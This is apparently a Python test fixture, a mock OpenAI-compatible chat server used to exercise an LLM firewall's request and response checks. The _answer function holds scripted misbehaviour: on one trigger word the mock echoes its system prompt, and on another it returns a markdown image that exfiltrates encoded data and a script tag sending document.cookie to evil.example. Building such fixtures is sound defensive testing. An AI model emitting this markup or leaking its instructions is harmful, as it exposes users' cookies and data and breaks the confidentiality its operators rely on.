"""OpenAI-compatible mock upstream for the native integration run. Counts every
request it receives (GET /__calls) so the test can prove blocked requests never
leave the firewall. Supports stream=true (SSE) and stream=false."""
import json
import time

from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse, StreamingResponse

app = FastAPI()
CALLS = {"n": 0, "last": None}


def _answer(body: dict) -> str:
    msgs = body.get("messages", [])
    user = [m for m in msgs if m.get("role") == "user"]
    q = user[-1]["content"] if user else ""
    q = q if isinstance(q, str) else " ".join(p.get("text", "") for p in q)
    # scripted misbehaviour, to exercise the firewall's response-side checks
    if "ECHO_SYSTEM" in q:                       # OWASP LLM07: model leaks its system prompt
        sys_msg = next((m["content"] for m in msgs if m.get("role") == "system"), "")
        return f"Of course! My instructions are: {sys_msg}"
    if "HOSTILE_MARKUP" in q:                    # OWASP LLM05: active markup + exfil image
        return ("Here is your summary. ![chart](https://collector.evil.example/p.png?d=YWNjb3VudD00MTEx) "
                "<script>fetch('https://evil.example/?c='+document.cookie)</script> Thanks!")
    return f"Mock answer to: {q[:60]}"


@app.post("/v1/chat/completions")
async def chat(request: Request):
    body = await request.json()
    CALLS["n"] += 1
    CALLS["last"] = body
    text = _answer(body)
    base = {"id": "chatcmpl-mock", "created": int(time.time()), "model": body.get("model", "mock")}
    if body.get("stream"):
        def gen():
            yield "data: " + json.dumps({**base, "object": "chat.completion.chunk", "choices": [
                {"index": 0, "delta": {"role": "assistant", "content": text}, "finish_reason": None}]}) + "\n\n"
            yield "data: " + json.dumps({**base, "object": "chat.completion.chunk", "choices": [
                {"index": 0, "delta": {}, "finish_reason": "stop"}]}) + "\n\n"
            yield "data: [DONE]\n\n"
        return StreamingResponse(gen(), media_type="text/event-stream")
    return JSONResponse({**base, "object": "chat.completion", "choices": [
        {"index": 0, "message": {"role": "assistant", "content": text}, "finish_reason": "stop"}],
        "usage": {"prompt_tokens": 5, "completion_tokens": 7, "total_tokens": 12}})


@app.get("/__calls")
async def calls():
    return CALLS
